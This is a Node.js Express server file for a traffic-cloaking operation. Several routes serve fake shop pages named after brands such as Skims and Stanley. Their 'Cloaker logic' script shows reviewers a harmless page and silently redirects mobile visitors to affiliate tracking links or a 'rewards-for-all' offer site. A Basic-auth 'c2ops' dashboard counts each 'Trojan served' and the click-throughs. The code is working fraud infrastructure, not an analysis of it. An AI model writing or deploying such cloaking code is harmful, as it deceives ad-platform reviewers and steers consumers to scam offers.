app.get('/princesspolly/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/9487bda1-ab6d-4760-b3c1-9902dfe97936?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (Skims CAMP)
app.get('/skims/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/a7108b36-664a-4ea8-937b-49d9e287af7d?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (Stanley CAMP)
app.get('/stanley/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/25ad63e2-5e8f-4fd0-9e2f-f03bb7e2e357?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to handle requests to /:offer/:slug
app.get('/:offer/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://rewards-for-all.com/${offer}.html`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to the ${slug} WebShop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served ${offer} Trojan (${slug})`);
});

// Console App

// Auth
const auth = (req, res, next) => {
    const authHeader = req.headers['authorization'];

    if (!authHeader) {
        res.setHeader('WWW-Authenticate', 'Basic');
        res.sendStatus(401);
        return;
    }

    const base64Credentials = authHeader.split(' ')[1];
    const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
    const [username, password] = credentials.split(':');

    const validUsername = 'c2ops';
    const validPassword = '$47';

    if (username === validUsername && password === validPassword) {
        next();
    } else {
        res.setHeader('WWW-Authenticate', 'Basic');
        res.sendStatus(401);
    }
};

// Apply the auth middleware to the /dashboard route
app.get('/dashboard', auth, (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Alexiares Console</title>
            <style>
                body {
                    background-color: #121212;
                    color: #ffffff;
                    font-family: 'Courier New', Courier, monospace;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .title {
                    font-size: 2em;
                    color: #00ffcc;
                    margin: 20px 0;
                }
                .block {
                    background-color: #1e1e1e;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
                    width: 80%;
                    max-width: 800px;
                    max-height: 70%; /* 70% larger vertically */
                    overflow-y: auto;
                    margin-bottom: 20px;
                }
                .line-item {
                    background-color: #333333;
                    margin: 10px 0;
                    padding: 10px;
                    border-radius: 5px;
                    box-shadow: 0 0 5px rgba(0, 255, 255, 0.3);
                }
                .console-container {
                    background-color: #1e1e1e;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
                    width: 80%;
                    max-width: 800px;
                    height: 300px; /* Set a fixed height for the console container */
                    margin-bottom: 20px;
                    overflow: hidden; /* Prevent outer scrollbar */
                }
                .console-log {
                    background-color: #000000;
                    padding: 10px;
                    border-radius: 5px;
                    color: #ffffff; /* Text color set to white */
                    white-space: pre-wrap;
                    word-wrap: break-word;
                    height: 100%;
                    overflow-y: auto; /* Only inner scrollbar */
                }
            </style>
        </head>
        <body>
            <div class="title">Alexiares v4.1</div>
            <div class="block" id="trojanBlock">
                <p>Total Trojans Served: <span id="totalTrojans">0</span></p>
                <p>Total LPVs Posted: <span id="totalLPVs">0</span></p>
                <p>Total CTRs Posted: <span id="totalCTRs">0</span></p>
                <div id="lineItems"></div>
            </div>
            <div class="console-container">
                <div id="console-log" class="console-log"></div>
            </div>
            <script>
                const socket = new WebSocket('wss://' + window.location.host);
                const consoleLog = document.getElementById('console-log');
                const totalTrojansElement = document.getElementById('totalTrojans');
                const totalLPVsElement = document.getElementById('totalLPVs');
                const totalCTRsElement = document.getElementById('totalCTRs');
                const lineItemsContainer = document.getElementById('lineItems');

                let totalTrojans = 0;
                let totalLPVs = 0;
                let totalCTRs = 0;
                let s1Data = {};

                socket.onmessage = function(event) {
                    const message = event.data;
                    const messageElement = document.createElement('div');
                    messageElement.textContent = message;
                    consoleLog.appendChild(messageElement);
                    consoleLog.scrollTop = consoleLog.scrollHeight;

                    if (message.startsWith('Served')) {
                        totalTrojans++;
                        totalTrojansElement.textContent = totalTrojans;

                        const offerMatch = message.match(/Served (\\w+) Trojan/);
                        const s1Match = message.match(/\$begin:math:text$([^)]+)\\$end:math:text$$/);
                        if (offerMatch && s1Match) {
                            const offer = offerMatch[1];
                            const s1 = s1Match[1];
                            const key = \`\${s1} (\${offer})\`;

                            if (!s1Data[key]) {
                                s1Data[key] = { trojans: 0, lpvs: 0, ctrs: 0, element: null };
                                const lineItem = document.createElement('div');
                                lineItem.classList.add('line-item');
                                lineItem.id = \`line-item-\${key}\`;
                                lineItem.textContent = \`\${s1}: 0 (\${offer}) - LPVs: 0 - CTRs: 0 - CTR: 0%\`;
                                s1Data[key].element = lineItem;
                                lineItemsContainer.appendChild(lineItem);
                            }
                            s1Data[key].trojans++;
                            updateLineItem(key);
                        }
                    }

                    if (message.startsWith('LPV Posted')) {
                        totalLPVs++;
                        totalLPVsElement.textContent = totalLPVs;

                        const s1Match = message.match(/\$begin:math:text$([^)]+)\\$end:math:text$$/);
                        if (s1Match) {
                            const s1 = s1Match[1];
                            Object.keys(s1Data).forEach(key => {
                                if (key.startsWith(s1)) {
                                    s1Data[key].lpvs++;
                                    updateLineItem(key);
                                }
                            });
                        }
                    }

                    if (message.startsWith('CTR Posted')) {
                        totalCTRs++;
                        totalCTRsElement.textContent = totalCTRs;

                        const s1Match = message.match(/\$begin:math:text$([^)]+)\\$end:math:text$$/);
                        if (s1Match) {
                            const s1 = s1Match[1];
                            Object.keys(s1Data).forEach(key => {
                                if (key.startsWith(s1)) {
                                    s1Data[key].ctrs++;
                                    updateLineItem(key);
                                }
                            });
                        }
                    }
                };

                function updateLineItem(key) {
                    const data = s1Data[key];
                    const ctr = data.lpvs > 0 ? ((data.ctrs / data.lpvs) * 100).toFixed(2) : 0;
                    data.element.textContent = \`\${key}: \${data.trojans} - LPVs: \${data.lpvs} - CTRs: \${data.ctrs} - CTR: \${ctr}%\`;
                }

                // Ensure the console log starts at the bottom on page load
                window.onload = () => {
                    consoleLog.scrollTop = consoleLog.scrollHeight;
                };
            </script>
        </body>
        </html>
    `);
});

// Create HTTP server
const server = http.createServer(app);

// Create WebSocket server
const wss = new WebSocket.Server({ server });

// Broadcast to all connected clients
wss.broadcast = function broadcast(data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(data);
        }
    });
};

// Log server console and broadcast to WebSocket clients
const log = console.log;
console.log = function (...args) {
    log.apply(console, args);
    const message = args.join(' ');
    wss.broadcast(message);
};

// Start the HTTP server
const PORT = 8080;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

